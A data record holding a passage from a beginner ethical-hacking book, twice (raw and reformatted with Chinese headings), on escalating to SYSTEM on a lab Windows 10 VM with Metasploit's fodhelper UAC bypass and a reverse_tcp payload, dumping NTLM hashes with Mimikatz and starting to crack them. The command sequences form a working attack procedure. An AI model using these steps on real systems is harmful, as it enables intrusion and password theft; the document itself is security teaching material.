- raw: "We’ll use a Metasploit exploit of the Windows `fodhelper` vulnerability to\
    \ get system-level access. Windows uses a program called *fodhelper.exe* (the\
    \ *fod* is short for “features on demand”) to manage regional settings like the\
    \ keyboard layout for your language of choice. This app is a good target for hackers\
    \ because it runs with higher privileges to be able to change language settings\
    \ across multiple apps, such as your web browser, word processor, and desktop.\n\
    \n1.  In your Kali VM, make sure you’re at the `msf6` command prompt, not interacting\
    \ with a Meterpreter session. If you see the `meterpreter >` command prompt, enter\
    \ `background` to return to the regular `msf6` command prompt:\n\n    ```\n  \
    \  meterpreter > background[*] Backgrounding session 1...\n    msf6 exploit(multi/handler)\
    \ >\n    ```\n\n2.  From the `msf6` prompt, enter the five commands shown in bold:\n\
    \n    ```\n    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\n\
    \    PAYLOAD => windows/meterpreter/reverse_tcp\n    msf6 exploit(multi/handler)\
    \ > use exploit/windows/local/bypassuac_fodhelper\n    [*] Using configured payload\
    \ windows/meterpreter/reverse_tcp\n    msf6 exploit(windows/local/bypassuac_fodhelper)\
    \ > set SESSION 1\n    SESSION => X\n    msf6 exploit(windows/local/bypassuac_fodhelper)\
    \ > set LHOST 10.0.9.x\n    LHOST => 10.0.9.x\n    msf6 exploit(windows/local/bypassuac_fodhelper)\
    \ > exploit\n    ```\n\n    Change the `set` `SESSION` command to match your session\
    \ number (if it isn’t 1) and change the `LHOST` IP address to match that of your\
    \ Kali machine.\n\n3.  The last command, `exploit`, might take a couple of tries.\
    \ If you get a message stating `no` `session` `was` `created`, use the up arrow\
    \ and press enter to run the `exploit` command again. When it succeeds, you’ll\
    \ see `Meterpreter` `session` `2` `opened`, meaning that the exploit has opened\
    \ a second session. Your command prompt will change back to `meterpreter >` to\
    \ indicate that you’re interacting with a new Meterpreter session.\n\n    Privilege\
    \ escalation is the highest-level, most technically challenging hack you’ll perform\
    \ in this book, and it might take several tries. If you keep seeing “no session\
    \ created” messages, check your Windows 10 VM to make sure Windows Defender’s\
    \ Virus & threat protection settings are still turned off. If you’re still stuck,\
    \ try rerunning the hack from the beginning. And, at some point in the next five\
    \ years, there’s a good chance Windows will fix the `fodhelper` vulnerability\
    \ and you’ll have to try a different exploit. Check the book’s website at [https://www.nostarch.com/go-hck-yourself/](https://www.nostarch.com/go-hck-yourself/)\
    \ for updates or do a web search for “Metasploit privilege escalation” on the\
    \ latest version of Windows.\n\n4.  Enter `getsystem` in Meterpreter to get system-level\
    \ access to the Windows 10 VM:\n\n    ```\n    meterpreter > getsystem\n    ...got\
    \ system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n    ```\n\
    \n5.  Check that you’ve got system-level access by entering `getuid`:\n\n    ```\n\
    \    meterpreter > getuid\n    Server username: NT AUTHORITY\\SYSTEM\n    ```\n\
    \n    Meterpreter will respond that your user ID is `NT` `Authority\\System`,\
    \ indicating that you now have system-level access.\n\n### Stealing Password Hashes\
    \ with Mimikatz\n\nNow that we have system-level privileges, we’re ready to steal\
    \ the password hashes. We’ll use Mimikatz, a hacking tool that can access Windows\
    \ passwords from multiple locations, including directly from the memory of the\
    \ computer while it’s running. The Mimikatz module in Metasploit is named `kiwi`\
    \ (the New Zealander who wrote Mimikatz, Benjamin Delpy, calls himself the Gentil\
    \ Kiwi).\n\n1.  Enter `use` `kiwi` at the Meterpreter prompt to load the Mimikatz\
    \ tools:\n\n    ```\n    meterpreter > use kiwi\n    ```\n\n2.  The Mimikatz startup\
    \ screen will appear in your Meterpreter console. Now we can dump the password\
    \ hashes for all users from the Windows 10 VM, like so:\n\n    ```\n    meterpreter\
    \ > lsa_dump_sam\n    ```\n\n3.  Mimikatz will answer by listing all the users\
    \ and Windows password hashes it can find:\n\n    ```\n    [+] Running as SYSTEM\n\
    \    [*] Dumping SAM--snip--\n    RID  : 000003f0 (1008)\n    User : peter  Hash\
    \ NTLM: e262404bfe47aa34ba668187b4209380\n    RID  : 000003f1 (1009)\n    User\
    \ : bryson Hash NTLM: 0a2b1c4f5d7ad37f9e2df24ff3ab4c48 \n    ```\n\n    The password\
    \ hashes use the *New Technology LAN Manager (NTLM) format*, one of the ways that\
    \ Windows computers store login information, including password hashes. We’ll\
    \ select this type of password hash later when we crack the passwords.\n\n4. \
    \ To crack the password hashes, we need to gather them in a text document. Highlight\
    \ the usernames and NTLM hashes, right-click the selection, and choose **Copy**\
    \ (you can’t use ctrl\\-C to copy in the Metasploit console; that’s the command\
    \ to quit or close a running process in a terminal window).\n\n5.  Open the Mousepad\
    \ Text Editor by clicking the Kali menu button and selecting **Favorites**▶**Text\
    \ Editor**. Press ctrl\\-V to paste the text you copied from Meterpreter into\
    \ Mousepad.\n\n6.  Click **File**▶**New** to open a second Mousepad window. Copy\
    \ and paste just the usernames and password hashes into this new document in the\
    \ format `username``:``hash`, with one username and hash value per line, separated\
    \ by a colon, as shown in [Figure 7-1](#c07.xhtml#figure7-1). Make sure there\
    \ are no extra spaces.\n\n    ![Figure 7-1: Copying and pasting the usernames\
    \ and NTLM hash values into a new text file](image_fi/502000c07/f07001.png)\n\n\
    \    Figure 7-1: Copying and pasting the usernames and NTLM hash values into a\
    \ new text file\n\n    Skip any users without hash values or any of the accounts\
    \ Windows created, like sshd, Guest, and DefaultAccount. You’re interested only\
    \ in real user and admin accounts, like IEUser, Administrator, and the user accounts\
    \ you created earlier in the chapter.\n\n7.  Save the file as *Windows\\_hashes.txt*\
    \ in your *Documents* folder.\n\n## Cracking Passwords\n\nNow that we have a document\
    \ of usernames and password hashes stolen from the Windows VM, we’re ready to\
    \ begin cracking the passwords. Hackers take a few different approaches to password\
    \ cracking. A *dictionary attack* uses a list of common passwords, hashing each\
    \ one to see if it matches the hash you’re trying to crack. Dictionary attacks\
    \ are fast, but they only help with relatively simple passwords. A *brute-force\
    \ attack* systematically tries every combination of characters to find even highly\
    \ complex passwords up to a certain length. This makes brute-force attacks very\
    \ thorough, but extremely slow. A *mask attack* is a special type of brute-force\
    \ attack we use when we know part of the password and have to brute-force just\
    \ a few characters.\n\nWe’ll try out a few approaches to password cracking. As\
    \ you’ll see, the internet and Kali Linux have resources that make short work\
    \ of cracking passwords. First, you’ll search a free online password database\
    \ to crack common password hashes. Then, you’ll use one of Kali’s many password-cracking\
    \ tools, John the Ripper, to crack more of the hashes. You’ll start with a password\
    \ dictionary attack for the easier passwords, and you’ll finish with a mask attack.\n\
    \n### Free Online Password Databases\n\nHashes.com is a web service that allows\
    \ you to search for passwords in a database of *billions* of previously cracked\
    \ hashes. Every time you hash a particular password, you get the same hash, so\
    \ the database can store each password with its hash. When you search for a hash,\
    \ the database returns the unencrypted password (if that password is in the database).\n\
    \n1.  In your Kali VM, open the Firefox browser and go to [https://hashes.com/decrypt/hash/](https://hashes.com/decrypt/hash/).\n\
    \n2.  Paste the usernames and password hashes from your *Windows\\_hashes.txt*\
    \ file into the Hashes text box. Then remove the usernames so that only the hashes\
    \ appear in the box, as shown in [Figure 7-2](#c07.xhtml#figure7-2)."
  fmt: "\n# 使用 Metasploit 利用 Windows fodhelper 漏洞\n\nWe’ll use a Metasploit exploit\
    \ of the Windows `fodhelper` vulnerability to get system-level access. Windows\
    \ uses a program called `fodhelper.exe` (the `fod` is short for “features on demand”)\
    \ to manage regional settings like the keyboard layout for your language of choice.\
    \ This app is a good target for hackers because it runs with higher privileges\
    \ to be able to change language settings across multiple apps, such as your web\
    \ browser, word processor, and desktop.\n\n## 1. 准备 Metasploit 会话\n\nIn your Kali\
    \ VM, make sure you’re at the `msf6` command prompt, not interacting with a Meterpreter\
    \ session. If you see the `meterpreter >` command prompt, enter `background` to\
    \ return to the regular `msf6` command prompt:\n\n```\nmeterpreter > background[*]\
    \ Backgrounding session 1...\nmsf6 exploit(multi/handler) >\n```\n\n## 2. 配置并运行漏洞利用模块\n\
    \nFrom the `msf6` prompt, enter the five commands shown in bold:\n\n```\nmsf6\
    \ exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD\
    \ => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper\n\
    [*] Using configured payload windows/meterpreter/reverse_tcp\nmsf6 exploit(windows/local/bypassuac_fodhelper)\
    \ > set SESSION 1\nSESSION => X\nmsf6 exploit(windows/local/bypassuac_fodhelper)\
    \ > set LHOST 10.0.9.x\nLHOST => 10.0.9.x\nmsf6 exploit(windows/local/bypassuac_fodhelper)\
    \ > exploit\n```\n\nChange the `set SESSION` command to match your session number\
    \ (if it isn’t 1) and change the `LHOST` IP address to match that of your Kali\
    \ machine.\n\nThe last command, `exploit`, might take a couple of tries. If you\
    \ get a message stating `no session was created`, use the up arrow and press enter\
    \ to run the `exploit` command again. When it succeeds, you’ll see `Meterpreter\
    \ session 2 opened`, meaning that the exploit has opened a second session. Your\
    \ command prompt will change back to `meterpreter >` to indicate that you’re interacting\
    \ with a new Meterpreter session.\n\nPrivilege escalation is the highest-level,\
    \ most technically challenging hack you’ll perform in this book, and it might\
    \ take several tries. If you keep seeing “no session created” messages, check\
    \ your Windows 10 VM to make sure Windows Defender’s Virus & threat protection\
    \ settings are still turned off. If you’re still stuck, try rerunning the hack\
    \ from the beginning. And, at some point in the next five years, there’s a good\
    \ chance Windows will fix the `fodhelper` vulnerability and you’ll have to try\
    \ a different exploit. Check the book’s website at [https://www.nostarch.com/go-hck-yourself/](https://www.nostarch.com/go-hck-yourself/)\
    \ for updates or do a web search for “Metasploit privilege escalation” on the\
    \ latest version of Windows.\n\n## 3. 获取系统级权限\n\nEnter `getsystem` in Meterpreter\
    \ to get system-level access to the Windows 10 VM:\n\n```\nmeterpreter > getsystem\n\
    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n\
    ```\n\nCheck that you’ve got system-level access by entering `getuid`:\n\n```\n\
    meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n\nMeterpreter\
    \ will respond that your user ID is `NT AUTHORITY\\System`, indicating that you\
    \ now have system-level access.\n\n# 使用 Mimikatz 窃取密码哈希\n\nNow that we have system-level\
    \ privileges, we’re ready to steal the password hashes. We’ll use Mimikatz, a\
    \ hacking tool that can access Windows passwords from multiple locations, including\
    \ directly from the memory of the computer while it’s running. The Mimikatz module\
    \ in Metasploit is named `kiwi` (the New Zealander who wrote Mimikatz, Benjamin\
    \ Delpy, calls himself the Gentil Kiwi).\n\n## 1. 加载 Mimikatz 工具\n\nEnter `use\
    \ kiwi` at the Meterpreter prompt to load the Mimikatz tools:\n\n```\nmeterpreter\
    \ > use kiwi\n```\n\n## 2. 转储密码哈希\n\nThe Mimikatz startup screen will appear in\
    \ your Meterpreter console. Now we can dump the password hashes for all users\
    \ from the Windows 10 VM, like so:\n\n```\nmeterpreter > lsa_dump_sam\n```\n\n\
    Mimikatz will answer by listing all the users and Windows password hashes it can\
    \ find:\n\n```\n[+] Running as SYSTEM\n[*] Dumping SAM--snip--\nRID  : 000003f0\
    \ (1008)\nUser : peter  Hash NTLM: e262404bfe47aa34ba668187b4209380\nRID  : 000003f1\
    \ (1009)\nUser : bryson Hash NTLM: 0a2b1c4f5d7ad37f9e2df24ff3ab4c48 \n```\n\n\
    The password hashes use the `New Technology LAN Manager (NTLM)` format, one of\
    \ the ways that Windows computers store login information, including password\
    \ hashes. We’ll select this type of password hash later when we crack the passwords.\n\
    \n## 3. 收集密码哈希\n\nTo crack the password hashes, we need to gather them in a text\
    \ document. Highlight the usernames and NTLM hashes, right-click the selection,\
    \ and choose `Copy` (you can’t use ctrl-C to copy in the Metasploit console; that’s\
    \ the command to quit or close a running process in a terminal window).\n\nOpen\
    \ the Mousepad Text Editor by clicking the Kali menu button and selecting `Favorites`▶`Text\
    \ Editor`. Press ctrl-V to paste the text you copied from Meterpreter into Mousepad.\n\
    \nClick `File`▶`New` to open a second Mousepad window. Copy and paste just the\
    \ usernames and password hashes into this new document in the format `username:hash`,\
    \ with one username and hash value per line, separated by a colon, as shown in\
    \ [Figure 7-1](#c07.xhtml#figure7-1). Make sure there are no extra spaces.\n\n\
    ![Figure 7-1: Copying and pasting the usernames and NTLM hash values into a new\
    \ text file](image_fi/502000c07/f07001.png)\n\nFigure 7-1: Copying and pasting\
    \ the usernames and NTLM hash values into a new text file\n\nSkip any users without\
    \ hash values or any of the accounts Windows created, like `sshd`, `Guest`, and\
    \ `DefaultAccount`. You’re interested only in real user and admin accounts, like\
    \ `IEUser`, `Administrator`, and the user accounts you created earlier in the\
    \ chapter.\n\nSave the file as `Windows_hashes.txt` in your `Documents` folder.\n\
    \n# 破解密码\n\nNow that we have a document of usernames and password hashes stolen\
    \ from the Windows VM, we’re ready to begin cracking the passwords. Hackers take\
    \ a few different approaches to password cracking. A `dictionary attack` uses\
    \ a list of common passwords, hashing each one to see if it matches the hash you’re\
    \ trying to crack. Dictionary attacks are fast, but they only help with relatively\
    \ simple passwords. A `brute-force attack` systematically tries every combination\
    \ of characters to find even highly complex passwords up to a certain length.\
    \ This makes brute-force attacks very thorough, but extremely slow. A `mask attack`\
    \ is a special type of brute-force attack we use when we know part of the password\
    \ and have to brute-force just a few characters.\n\nWe’ll try out a few approaches\
    \ to password cracking. As you’ll see, the internet and Kali Linux have resources\
    \ that make short work of cracking passwords. First, you’ll search a free online\
    \ password database to crack common password hashes. Then, you’ll use one of Kali’s\
    \ many password-cracking tools, John the Ripper, to crack more of the hashes.\
    \ You’ll start with a password dictionary attack for the easier passwords, and\
    \ you’ll finish with a mask attack.\n\n## 免费在线密码数据库\n\nHashes.com is a web service\
    \ that allows you to search for passwords in a database of `billions` of previously\
    \ cracked hashes. Every time you hash a particular password, you get the same\
    \ hash, so the database can store each password with its hash. When you search\
    \ for a hash, the database returns the unencrypted password (if that password\
    \ is in the database).\n\n## 1. 访问 Hashes.com\n\nIn your Kali VM, open the Firefox\
    \ browser and go to [https://hashes.com/decrypt/hash/](https://hashes.com/decrypt/hash/).\n\
    \nPaste the usernames and password hashes from your `Windows_hashes.txt` file\
    \ into the Hashes text box. Then remove the usernames so that only the hashes\
    \ appear in the box, as shown in [Figure 7-2](#c07.xhtml#figure7-2).\n"
